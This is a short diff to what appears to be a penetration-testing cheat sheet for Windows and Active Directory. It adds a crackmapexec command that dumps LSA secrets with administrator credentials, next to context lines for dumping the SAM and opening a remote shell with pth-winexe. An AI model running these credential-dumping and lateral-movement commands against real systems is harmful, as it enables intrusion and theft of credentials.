@@ -179,6 +179,8 @@ https://github.com/sense-of-security/ADRecon
 
 `crackmapexec smb 172.16.110.154 -u Administrator -p Password1 --sam`
 
+`crackmapexec smb 172.16.110.154 -u Administrator -p Password1 --lsa`
+
 ### Winexe to boxes (not opsec safe) - service is run. No cleanup.
 
 `pth-winexe //10.0.0.1 -U DOMAINBLAH/blahuser%blahpassword cmd`
